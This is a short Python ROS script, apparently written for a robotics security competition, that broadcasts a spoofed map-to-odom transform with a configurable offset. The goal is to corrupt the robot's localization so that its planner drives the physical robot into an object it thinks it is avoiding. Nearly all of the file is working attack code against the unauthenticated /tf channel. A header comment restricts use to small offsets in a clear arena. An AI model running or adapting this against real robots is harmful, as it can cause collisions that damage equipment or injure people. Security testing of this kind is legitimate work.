#!/usr/bin/env python3
"""
tf_offset.py  --  Criterion 3.3 / Criterion 6 helper (TF corruption).

Publishes a competing transform (default map->odom) with a translation offset so
the planner's belief of where the robot is drifts, causing it to drive the real
robot into an object it thinks it is avoiding. Demonstrates that /tf is
unauthenticated on the ROS graph. Network vector (full points).

SAFETY: this breaks localization while it runs. Small offsets only, arena clear,
kill it as soon as the demonstration is captured so TF recovers.

Usage:
  python3 tf_offset.py --parent map --child odom --dx 0.3 --dy 0.0 --rate 20
"""
import argparse
import sys


def main():
    ap = argparse.ArgumentParser(description="Publish an offset TF (Criterion 3.3)")
    ap.add_argument("--parent", default="map")
    ap.add_argument("--child", default="odom")
    ap.add_argument("--dx", type=float, default=0.3)
    ap.add_argument("--dy", type=float, default=0.0)
    ap.add_argument("--dyaw", type=float, default=0.0, help="radians")
    ap.add_argument("--rate", type=float, default=20.0)
    args = ap.parse_args()

    import rospy
    import tf2_ros
    import math
    from geometry_msgs.msg import TransformStamped

    rospy.init_node("phishers_tf_offset", anonymous=True)
    br = tf2_ros.TransformBroadcaster()
    r = rospy.Rate(args.rate)
    qz, qw = math.sin(args.dyaw / 2.0), math.cos(args.dyaw / 2.0)

    print("publishing %s->%s offset dx=%.2f dy=%.2f dyaw=%.2f @%.0fHz -- Ctrl+C to stop"
          % (args.parent, args.child, args.dx, args.dy, args.dyaw, args.rate))

    while not rospy.is_shutdown():
        t = TransformStamped()
        t.header.stamp = rospy.Time.now()
        t.header.frame_id = args.parent
        t.child_frame_id = args.child
        t.transform.translation.x = args.dx
        t.transform.translation.y = args.dy
        t.transform.translation.z = 0.0
        t.transform.rotation.z = qz
        t.transform.rotation.w = qw
        br.sendTransform(t)
        r.sleep()


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        sys.exit(130)
